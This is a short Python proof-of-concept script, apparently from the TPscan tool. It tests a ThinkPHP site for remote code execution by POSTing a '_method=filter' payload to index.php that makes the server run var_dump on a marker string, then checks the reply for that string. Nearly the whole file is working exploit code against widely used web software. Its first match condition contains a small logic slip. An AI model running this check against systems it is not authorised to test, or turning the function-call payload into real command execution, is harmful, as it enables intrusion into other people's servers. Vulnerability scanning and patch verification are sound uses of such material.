#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3
from termcolor import colored

urllib3.disable_warnings()


def thinkphp_method_filter_code_exec_verify(url):
    """ thinkphp_method_filter_code_exec_verify """
    pocdict = {
        "vulnname": "thinkphp_method_filter_code_exec",
        "isvul": False,
        "vulnurl": "",
        "payload": "",
        "proof": "",
        "response": "",
        "exception": "",
    }
    headers = {
        "User-Agent": 'TPscan',
    }
    payload = {
        'c': 'var_dump',
        'f': 'f7e0b956540676a129760a3eae309294',
        '_method': 'filter',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
        if r"string(32)" and r"56540676a129760a3ea" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['payload'] = payload
            pocdict['proof'] = '56540676a129760a3ea'
            pocdict['response'] = req.status_code
            print(colored("[+] 目标存在 thinkphp_method_filter_code_exec 漏洞\tpayload: ", "green"))
            print(colored(pocdict, 'green'))
        else:
            print(colored("\n[*] 目标不存在 thinkphp_method_filter_code_exec 漏洞", "red"))
    except:
        print(colored("\n[*] 目标不存在 thinkphp_method_filter_code_exec 漏洞", "red"))
